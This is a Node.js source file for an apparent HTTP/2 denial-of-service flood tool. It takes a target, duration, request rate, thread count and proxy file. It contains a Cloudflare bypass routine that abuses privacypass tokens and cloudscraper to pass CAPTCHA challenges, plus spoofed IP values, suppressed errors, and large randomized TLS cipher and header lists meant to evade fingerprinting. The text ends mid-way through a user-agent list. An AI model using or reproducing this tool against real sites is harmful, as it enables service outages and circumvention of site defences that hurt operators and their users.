const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const fs = require("fs");
 scp = require("set-cookie-parser");
 const gradient = require("gradient-string")
 cloudscraper = require('cloudscraper')
 const {
  HeaderGenerator
} = require('header-generator');
const os = require('os');
var privacyPassSupport = true;


 module.exports = function Cloudflare() {
    const privacypass = require('./privacypass'),
    cloudscraper = require('cloudscraper'),
        request = require('request'),
        fs = require('fs');
    function useNewToken() {
        privacypass(l7.target);
        console.log('[cloudflare-bypass ~ privacypass]: generated new token');
    }

    if (l7.firewall[1] == 'captcha') {
        privacyPassSupport = l7.firewall[2];
        useNewToken();
    }

    function bypass(proxy, uagent, callback, force) {
        num = Math.random() * Math.pow(Math.random(), Math.floor(Math.random() * 10))
        var cookie = "";
        if (l7.firewall[1] == 'captcha' || force && privacyPassSupport) {
            request.get({
                url: l7.target + "?_asds=" + num,
                gzip: true,
                proxy: proxy,
                headers: {
                    'Connection': 'Keep-Alive',
                    'Cache-Control': 'max-age=0',
                    'Upgrade-Insecure-Requests': 1,
                    'User-Agent': uagent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'en-US;q=0.9'
                }
            }, (err, res) => {
                if (!res) {
                    return false;
                }
                if (res.headers['cf-chl-bypass'] && res.headers['set-cookie']) {

                } else {
                    if (l7.firewall[1] == 'captcha') {
                        logger('[cloudflare-bypass]: The target is not supporting privacypass');
                        return false;
                    } else {
                        privacyPassSupport = false;
                    }
                }

                cookie = res.headers['set-cookie'].shift().split(';').shift();
                if (l7.firewall[1] == 'captcha' && privacyPassSupport || force && privacyPassSupport) {
                    cloudscraper.get({
                        url: l7.target + "?_asds=" + num,
                        gzip: true,
                        proxy: proxy,
                        headers: {
                            'Connection': 'Keep-Alive',
                            'Cache-Control': 'max-age=0',
                            'Upgrade-Insecure-Requests': 1,
                            'User-Agent': uagent,
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Accept-Language': 'en-US;q=0.9',
                            'challenge-bypass-token': l7.privacypass,
                            "Cookie": cookie
                        }
                    }, (err, res) => {
                        if (err || !res) return false;
                        if (res.headers['set-cookie']) {
                            cookie += '; ' + res.headers['set-cookie'].shift().split(';').shift();
                            cloudscraper.get({
                                url: l7.target + "?_asds=" + num,
                                proxy: proxy,
                                headers: {
                                    'Connection': 'Keep-Alive',
                                    'Cache-Control': 'max-age=0',
                                    'Upgrade-Insecure-Requests': 1,
                                    'User-Agent': uagent,
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                                    'Accept-Encoding': 'gzip, deflate, br',
                                    'Accept-Language': 'en-US;q=0.9',
                                    "Cookie": cookie
                                }
                            }, (err, res, body) => {
                                if (err || !res || res && res.statusCode == 403) {
                                    console.warn('[cloudflare-bypass ~ privacypass]: Failed to bypass with privacypass, generating new token:');
                                    useNewToken();
                                    return;
                                }

                                callback(cookie);
                            });
                        } else {
                            console.log(res.statusCode, res.headers);
                            if (res.headers['cf-chl-bypass-resp']) {
                                let respHeader = res.headers['cf-chl-bypass-resp'];
                                switch (respHeader) {
                                    case '6':
                                        console.warn("[privacy-pass]: internal server connection error occurred");
                                        break;
                                    case '5':
                                        console.warn(`[privacy-pass]: token verification failed for ${l7.target}`);
                                        useNewToken();
                                        break;
                                    case '7':
                                        console.warn(`[privacy-pass]: server indicated a bad client request`);
                                        break;
                                    case '8':
                                        console.warn(`[privacy-pass]: server sent unrecognised response code (${header.value})`);
                                        break;
                                }
                                return bypass(proxy, uagent, callback, true);
                            }
                        }
                    });
                } else {
                    cloudscraper.get({
                        url: l7.target + "?_asds=" + num,
                        proxy: proxy,
                        headers: {
                            'Connection': 'Keep-Alive',
                            'Cache-Control': 'max-age=0',
                            'Upgrade-Insecure-Requests': 1,
                            'User-Agent': uagent,
                            'Accept-Language': 'en-US;q=0.9'
                        }
                    }, (err, res) => {
                        if (err || !res || !res.request.headers.cookie) {
                            if (err) {
                                if (err.name == 'CaptchaError') {
                                    return bypass(proxy, uagent, callback, true);
                                }
                            }
                            return false;
                        }
                        callback(res.request.headers.cookie);
                    });
                }
            });
        } else if (l7.firewall[1] == 'uam' && privacyPassSupport == false) {
            cloudscraper.get({
                url: l7.target + "?_asds=" + num,
                proxy: proxy,
                headers: {
                    'Upgrade-Insecure-Requests': 1,
                    'User-Agent': uagent
                }
            }, (err, res, body) => {
                if (err) {
                    if (err.name == 'CaptchaError') {
                        return bypass(proxy, uagent, callback, true);
                    }
                    return false;
                }
                if (res && res.request.headers.cookie) {
                    callback(res.request.headers.cookie);
                } else if (res && body && res.headers.server == 'cloudflare') {
                    if (res && body && /Why do I have to complete a CAPTCHA/.test(body) && res.headers.server == 'cloudflare' && res.statusCode !== 200) {
                        return bypass(proxy, uagent, callback, true);
                    }
                } else {

                }
            });
        } else {
            cloudscraper.get({
                url: l7.target + "?_asds=" + num,
                gzip: true,
                proxy: proxy,
                headers: {
                    'Connection': 'Keep-Alive',
                    'Cache-Control': 'max-age=0',
                    'Upgrade-Insecure-Requests': 1,
                    'User-Agent': uagent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'en-US;q=0.9'
                }
            }, (err, res, body) => {
                if (err || !res || !body || !res.headers['set-cookie']) {
                    if (res && body && /Why do I have to complete a CAPTCHA/.test(body) && res.headers.server == 'cloudflare' && res.statusCode !== 200) {
                        return bypass(proxy, uagent, callback, true);
                    }
                    return false;
                }
                cookie = res.headers['set-cookie'].shift().split(';').shift();
                callback(cookie);
            });
        }
    }

    return bypass;
}
 

process.on('uncaughtException', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
 
if (process.argv.length < 7){console.log(gradient.vice(`
node methodkontol <target> <duration> <request per second> <threads> <proxyfile>`));; process.exit();}
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 
 
 function randstr(length) {
   const characters =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   let result = "";
   const charactersLength = characters.length;
   for (let i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
 }
 
 const ip_spoof = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 255);
   };
   return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
 };
 
 const spoofed = ip_spoof();

 const ip_spoof2 = () => {
    const getRandomByte = () => {
      return Math.floor(Math.random() * 9999);
    };
    return `${getRandomByte()}`;
  };
  
  const spoofed2 = ip_spoof2();
 
 const args = {
     target: process.argv[2],
     time: parseInt(process.argv[3]),
     Rate: parseInt(process.argv[4]),
     threads: parseInt(process.argv[5]),
     proxyFile: process.argv[6]
 }
 const sig = [    
'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
'ecdsa_brainpoolP256r1tls13_sha256',
'ecdsa_brainpoolP384r1tls13_sha384',
'ecdsa_brainpoolP512r1tls13_sha512',
'ecdsa_sha1',
'ed25519',
'ed448',
'ecdsa_sha224',
'rsa_pkcs1_sha1',
'rsa_pss_pss_sha256',
'dsa_sha256',
'dsa_sha384',
'dsa_sha512',
'dsa_sha224',
'dsa_sha1',
'rsa_pss_pss_sha384',
'rsa_pkcs1_sha2240',
'rsa_pss_pss_sha512',
'sm2sig_sm3',
'ecdsa_secp521r1_sha512'
 ];

 const cplist = [
 
'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
"ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
"ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
"AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
"ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
"ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
"AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
"EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
"HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
"ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
 ];
 
  const accept_header = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel"  
 ]; 

const lang_header = [
  'en-US,en;q=0.9',
  'en-GB,en;q=0.9',
  'en-CA,en;q=0.9',
  'en-AU,en;q=0.9',
  'en-NZ,en;q=0.9',
  'en-ZA,en;q=0.9',
  'en-IE,en;q=0.9',
  'en-IN,en;q=0.9',
  'ar-SA,ar;q=0.9',
  'az-Latn-AZ,az;q=0.9',
  'be-BY,be;q=0.9',
  'bg-BG,bg;q=0.9',
  'bn-IN,bn;q=0.9',
  'ca-ES,ca;q=0.9',
  'cs-CZ,cs;q=0.9',
  'cy-GB,cy;q=0.9',
  'da-DK,da;q=0.9',
  'de-DE,de;q=0.9',
  'el-GR,el;q=0.9',
  'es-ES,es;q=0.9',
  'et-EE,et;q=0.9',
  'eu-ES,eu;q=0.9',
  'fa-IR,fa;q=0.9',
  'fi-FI,fi;q=0.9',
  'fr-FR,fr;q=0.9',
  'ga-IE,ga;q=0.9',
  'gl-ES,gl;q=0.9',
  'gu-IN,gu;q=0.9',
  'he-IL,he;q=0.9',
  'hi-IN,hi;q=0.9',
  'hr-HR,hr;q=0.9',
  'hu-HU,hu;q=0.9',
  'hy-AM,hy;q=0.9',
  'id-ID,id;q=0.9',
  'is-IS,is;q=0.9',
  'it-IT,it;q=0.9',
  'ja-JP,ja;q=0.9',
  'ka-GE,ka;q=0.9',
  'kk-KZ,kk;q=0.9',
  'km-KH,km;q=0.9',
  'kn-IN,kn;q=0.9',
  'ko-KR,ko;q=0.9',
  'ky-KG,ky;q=0.9',
  'lo-LA,lo;q=0.9',
  'lt-LT,lt;q=0.9',
  'lv-LV,lv;q=0.9',
  'mk-MK,mk;q=0.9',
  'ml-IN,ml;q=0.9',
  'mn-MN,mn;q=0.9',
  'mr-IN,mr;q=0.9',
  'ms-MY,ms;q=0.9',
  'mt-MT,mt;q=0.9',
  'my-MM,my;q=0.9',
  'nb-NO,nb;q=0.9',
  'ne-NP,ne;q=0.9',
  'nl-NL,nl;q=0.9',
  'nn-NO,nn;q=0.9',
  'or-IN,or;q=0.9',
  'pa-IN,pa;q=0.9',
  'pl-PL,pl;q=0.9',
  'pt-BR,pt;q=0.9',
  'pt-PT,pt;q=0.9',
  'ro-RO,ro;q=0.9',
  'ru-RU,ru;q=0.9',
  'si-LK,si;q=0.9',
  'sk-SK,sk;q=0.9',
  'sl-SI,sl;q=0.9',
  'sq-AL,sq;q=0.9',
  'sr-Cyrl-RS,sr;q=0.9',
  'sr-Latn-RS,sr;q=0.9',
  'sv-SE,sv;q=0.9',
  'sw-KE,sw;q=0.9',
  'ta-IN,ta;q=0.9',
  'te-IN,te;q=0.9',
  'th-TH,th;q=0.9',
  'tr-TR,tr;q=0.9',
  'uk-UA,uk;q=0.9',
  'ur-PK,ur;q=0.9',
  'uz-Latn-UZ,uz;q=0.9',
  'vi-VN,vi;q=0.9',
  'zh-CN,zh;q=0.9',
  'zh-HK,zh;q=0.9',
  'zh-TW,zh;q=0.9',
  'am-ET,am;q=0.8',
  'as-IN,as;q=0.8',
  'az-Cyrl-AZ,az;q=0.8',
  'bn-BD,bn;q=0.8',
  'bs-Cyrl-BA,bs;q=0.8',
  'bs-Latn-BA,bs;q=0.8',
  'dz-BT,dz;q=0.8',
  'fil-PH,fil;q=0.8',
  'fr-CA,fr;q=0.8',
  'fr-CH,fr;q=0.8',
  'fr-BE,fr;q=0.8',
  'fr-LU,fr;q=0.8',
  'gsw-CH,gsw;q=0.8',
  'ha-Latn-NG,ha;q=0.8',
  'hr-BA,hr;q=0.8',
  'ig-NG,ig;q=0.8',
  'ii-CN,ii;q=0.8',
  'is-IS,is;q=0.8',
  'jv-Latn-ID,jv;q=0.8',
  'ka-GE,ka;q=0.8',
  'kkj-CM,kkj;q=0.8',
  'kl-GL,kl;q=0.8',
  'km-KH,km;q=0.8',
  'kok-IN,kok;q=0.8',
  'ks-Arab-IN,ks;q=0.8',
  'lb-LU,lb;q=0.8',
  'ln-CG,ln;q=0.8',
  'mn-Mong-CN,mn;q=0.8',
  'mr-MN,mr;q=0.8',
  'ms-BN,ms;q=0.8',
  'mt-MT,mt;q=0.8',
  'mua-CM,mua;q=0.8',
  'nds-DE,nds;q=0.8',
  'ne-IN,ne;q=0.8',
  'nso-ZA,nso;q=0.8',
  'oc-FR,oc;q=0.8',
  'pa-Arab-PK,pa;q=0.8',
  'ps-AF,ps;q=0.8',
  'quz-BO,quz;q=0.8',
  'quz-EC,quz;q=0.8',
  'quz-PE,quz;q=0.8',
  'rm-CH,rm;q=0.8',
  'rw-RW,rw;q=0.8',
  'sd-Arab-PK,sd;q=0.8',
  'se-NO,se;q=0.8',
  'si-LK,si;q=0.8',
  'smn-FI,smn;q=0.8',
  'sms-FI,sms;q=0.8',
  'syr-SY,syr;q=0.8',
  'tg-Cyrl-TJ,tg;q=0.8',
  'ti-ER,ti;q=0.8',
  'tk-TM,tk;q=0.8',
  'tn-ZA,tn;q=0.8',
  'tt-RU,tt;q=0.8',
  'ug-CN,ug;q=0.8',
  'uz-Cyrl-UZ,uz;q=0.8',
  've-ZA,ve;q=0.8',
  'wo-SN,wo;q=0.8',
  'xh-ZA,xh;q=0.8',
  'yo-NG,yo;q=0.8',
  'zgh-MA,zgh;q=0.8',
  'zu-ZA,zu;q=0.8'
];

  const encoding_header = [
  'gzip',
  'gzip, deflate, br',
  'compress, gzip',
  'deflate, gzip',
  'gzip, identity',
  'gzip, deflate',
  'br',
  'br;q=1.0, gzip;q=0.8, *;q=0.1',
  'gzip;q=1.0, identity; q=0.5, *;q=0',
  'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
  'compress;q=0.5, gzip;q=1.0',
  'identity',
  'gzip, compress',
  'compress, deflate',
  'compress',
  'gzip, deflate, br',
  'deflate',
  'gzip, deflate, lzma, sdch',
  'deflate'
 ];
   
   const control_header = [ 
    'max-age=604800',
   'proxy-revalidate',
   'public, max-age=0',
   'max-age=315360000',
   'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800',
   's-maxage=604800',
   'max-stale',
   'public, immutable, max-age=31536000',
   'must-revalidate',
   'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
   'max-age=31536000,public,immutable',
   'max-age=31536000,public',
   'min-fresh',
   'private',
   'public',
   's-maxage',
   'no-cache',
   'no-cache, no-transform',
   'max-age=2592000',
   'no-store',
   'no-transform',
   'max-age=31557600',
   'stale-if-error',
   'only-if-cached',
   'max-age=0',
   'must-understand, no-store',
   'max-age=31536000; includeSubDomains',
   'max-age=31536000; includeSubDomains; preload',
   'max-age=120',
   'max-age=0,no-cache,no-store,must-revalidate',
   'public, max-age=604800, immutable',
   'max-age=0, must-revalidate, private',
   'max-age=0, private, must-revalidate',
   'max-age=604800, stale-while-revalidate=86400',
   'max-stale=3600',
   'public, max-age=2678400',
   'min-fresh=600',
   'public, max-age=30672000',
   'max-age=31536000, immutable',
   'max-age=604800, stale-if-error=86400',
   'public, max-age=604800',
   'no-cache, no-store,private, max-age=0, must-revalidate',
   'o-cache, no-store, must-revalidate, pre-check=0, post-check=0',
   'public, s-maxage=600, max-age=60',
   'public, max-age=31536000',
   'max-age=14400, public',
   'max-age=14400',
   'max-age=600, private',
   'public, s-maxage=600, max-age=60',
   'no-store, no-cache, must-revalidate',
   'no-cache, no-store,private, s-maxage=604800, must-revalidate',
  ];

 const Methods = [
    "GET",
    "HEAD",
    "POST",
    "PUT",
    "DELETE",
    "CONNECT",
    "OPTIONS",
    "TRACE",
    "PATCH",
  ];

const extensions = [
    '.net', '.com', '.org', '.info', '.xyz', '.co', '.io', 
    '.biz', '.us', '.me', '.tv', '.mobi', '.cc', '.ws', 
    '.online', '.site', '.tech', '.space', '.store', '.website', 
    '.app', '.dev', '.ai', '.cloud', '.guru', '.network', 
    '.global', '.life', '.today', '.world'
];

const randomExtension = extensions[Math.floor(Math.random() * extensions.length)];
const refers = 'https://' + randstr(6) + randomExtension;

 useragents = [
    '(CheckSecurity 2_0)',
    '(BraveBrowser 5_0)',
    '(ChromeBrowser 3_0)',
    '(ChromiumBrowser 4_0)',
